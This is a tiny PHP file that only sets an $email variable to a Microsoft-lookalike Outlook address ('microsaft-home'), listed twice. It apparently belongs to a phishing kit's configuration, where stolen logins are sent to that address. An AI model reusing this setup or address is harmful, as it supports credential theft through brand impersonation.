<?php

$email = "microsaft-home@outlook.com, microsaft-home@outlook.com"; //

?>